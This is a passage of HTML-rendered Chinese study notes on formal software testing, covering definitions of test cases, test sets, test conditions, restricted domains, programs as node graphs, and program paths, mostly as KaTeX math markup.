class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">...</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">..</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li>一个测试用例经常被表示为一组 输入变量或输出变量和相应的值的组合，例如 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>c</mi><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><mi>x</mi><mn>1</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>x</mi><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>y</mi><mn>1</mn><mo separator="true">,</mo><mn>8</mn><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">tc=\{(x1,5),(x2,3),(y1,8)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{(</span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mclose">)}</span></span></span></span></eq></li></ul><h5 id="define-5-test-set" tabindex="-1">Define 5 test set</h5><ul><li>一个测试集合是一组测试用例的集合。通常表示为一组成对的集合。</li><li>一个测试套件是一个预期用于特定目的的测试集合。</li></ul><h5 id="define-6-test-condition" tabindex="-1">Define 6 test condition</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><mi>G</mi><mo>∧</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">S_{pre}\wedge G \wedge D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 为操作 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 的一个功能场景，随后 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">S_{pre}\wedge G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq> 称为功能场景的 <strong>测试条件</strong></li><li>由于测试条件 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">S_{pre}\wedge G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq> 只包含操作的输入数据，因此用于检查条件 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 是否正确实现的测试数据（或没有预期结果的测试用例）仅基于测试条件生成。 定义条件形成了测试oracle，如2.3所述</li></ul><h5 id="define-7-restricted-domain" tabindex="-1">Define 7 restricted domain</h5><ul><li>操作S的受限域是操作域的子集，在每个子集中，每个值都满足操作规范的前置条件。</li></ul><h5 id="define-8-program" tabindex="-1">Define 8 program</h5><ul><li>一个程序是一个5元组 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>S</mi><mi>N</mi><mo separator="true">,</mo><mi>C</mi><mi>N</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S_0,SN,CN,R,T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq> , <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">S_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 是开始节点， <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">SN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span></span></span></span></eq> 状态节点集合，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">CN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span></span></span></span></eq> 条件节点集合，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></eq> 关系中节点，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 是终止节点，它们满足以下条件<ul><li><ol><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>0</mn></msub><mo>∈</mo><mi>S</mi><mi>N</mi><mo>∪</mo><mi>C</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">S_0 \in SN \cup CN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>$R:(SN\cup CN) \times (SN\cup CN)  $</li></ol></li><li><ol start="3"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>∈</mo><mi>S</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">T \in SN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span></span></span></span></eq></li></ol></li></ul></li><li>一个程序可以被表示为一个由五个元素 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>S</mi><mi>N</mi><mo separator="true">,</mo><mi>C</mi><mi>N</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>T</mi></mrow><annotation encoding="application/x-tex">S_0,SN,CN,R,T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 组成的语义等价图，满足上述三个条件。<ul><li>程序中的每个语句，包括空语句（用 skip 表示），都由 SN 中的一个节点表示，称为语句节点。</li><li>每个条件（一个谓词）都由 CN 中的一个节点表示，称为条件节点。</li><li>节点之间的连接（包括语句节点和条件节点），反映了语句之间的控制流，由关系 R 表示。</li><li>起始节点 S0 表示程序的第一个语句或条件。</li><li>终止节点 T 中的节点表示在程序的执行中必须最后执行的语句。</li><li>一个程序还具有这样的特点，即每个条件节点都与另外两个唯一的节点相连接，每个节点都是一个语句节点或条件节点</li></ul></li></ul><h5 id="define-8-program-path" tabindex="-1">Define 8 program path</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>S</mi><mi>N</mi><mo separator="true">,</mo><mi>C</mi><mi>N</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=(S_0,SN,CN,R,T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq> 为程序，一个程序路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 一个节点序列 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>n</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>n</mi><mi>m</mi></msub><mo stretchy="false">]</mo><mo separator="true">,</mo><msub><mi>n</mi><mi>m</mi></msub><mo>∈</mo><mi>T</mi></mrow><annotation encoding="application/x-tex">[S_0,n_1,n_2,...n_m],n_m\in T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq>.</li><li>我们令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>n</mi><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mrow><mi>m</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>n</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">E(p) = \{(S_0,n1),(n_1,n_2),...(n_{m-1},n_m)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span 